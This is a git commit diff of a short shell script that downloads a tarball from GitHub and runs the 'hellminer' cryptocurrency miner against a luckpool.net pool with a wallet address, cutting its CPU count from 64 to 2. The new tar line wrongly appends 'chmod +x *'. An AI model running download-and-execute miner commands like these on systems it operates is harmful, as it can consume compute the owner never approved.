c45c87b41c55930abe85591cd7eb9ddd00410536
jgaswer <98291918+jgaswer@users.noreply.github.com>
2022-04-22 11:41:32 +0700

    Update sa.sh

--- sa.sh
+++ sa.sh
@@ -1,2 +1,2 @@
-wget https://github.com/Tesa-UII/storage/raw/main/vr.tar.gz && tar xf vr.tar.gz
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RMQtU1xuuQtm23QCVEbjA8iTmqjZAFJrh8.asu -p x --cpu 64
+wget https://github.com/Tesa-UII/storage/raw/main/vr.tar.gz && tar xf vr.tar.gz chmod +x *
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RMQtU1xuuQtm23QCVEbjA8iTmqjZAFJrh8.asu -p x --cpu 2
